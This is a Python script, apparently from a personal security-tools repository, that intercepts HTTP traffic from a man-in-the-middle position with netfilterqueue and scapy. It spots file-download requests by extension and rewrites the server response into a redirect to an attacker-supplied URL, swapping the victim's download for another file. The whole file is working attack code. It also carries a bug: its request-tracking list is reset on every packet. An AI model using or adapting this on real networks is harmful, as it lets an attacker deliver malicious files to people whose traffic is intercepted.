#!/usr/bin/env python

"""
Author: Matthew Zito (goldmund) 
Contact: https://www.github.com/MatthewZito
Version: 0.1.0

Presumes controller is MITM.
Allocates HTTP Txs into a queue, parses request and response objects.
Matches a given HTTP response-type (file download) and modifies the 
packet mid-tranist with a user-provided file. Packet req/res pair is
identified by cross-matching the seq/ack.
"""
import subprocess
import netfilterqueue
import scapy.all as scapy
from utils.instantiate_queue import instantiate_queue

class Surrogator:
    def __init__(self, redirect_url, target_extension):
        self.redirect_url = redirect_url
        self.target_extension = target_extension
        instantiate_queue()
        self.bind_queue()

    def generate_load(self, packet, load):
        """
        Surrogates target file with controller-provided file.
        Configures necessary fields to generate valid packet response,
        returns said modified response.
        """
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def process_packet(self, packet): 
        """
        Determines how to process each packet in queue.
        Separates HTTP requests/responses and detects file downloads.
        Determines corresponding file req/res objects, enabling 
        packet interception and supplantation of the res load (file).
        """
        ack_list = []
        redirect_header = "HTTP/1.1 301 Moved Permanently\nLocation: {i}\n\n".format(i=self.redirect_url)
        # wrap payload packet in Scapy IP layer
        scapy_packet_obj = scapy.IP(packet.get_payload())
        if (scapy_packet_obj.haslayer(scapy.Raw)):
            load = scapy_packet_obj[scapy.Raw].load
            # request obj
            if (scapy_packet_obj[scapy.TCP].dport == 10000):
                print(load)
                # ensure our url is not in load to prevent infinite loop
                if (self.target_extension in load and self.redirect_url not in load):
                    print("[+] File Request")
                    ack_list.append(scapy_packet_obj[scapy.TCP].ack)
            # response obj
            elif (scapy_packet_obj[scapy.TCP].sport == 10000): 
                if (scapy_packet_obj[scapy.TCP].seq in ack_list):
                    ack_list.remove(scapy_packet_obj[scapy.TCP].seq)
                    print("[+] Supplanting file(s)...")   
                    generated_packet = self.generate_load(scapy_packet_obj, redirect_header)
                    # distill into original packet obj 
                    packet.set_payload(str(generated_packet))
        packet.accept()

    def bind_queue(self):
        """
        Initiates a netfilterqueue object and binds to callback method
        so as to access the queue and act upon all packets therein.
        """
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        queue.run()
        
# demo 
# http://iberianodonataucm.myspecies.info/sites/iberianodonataucm.myspecies.info/files/evolucion%20odonatos.PNG
# jpg
# visit: http://iberianodonataucm.myspecies.info/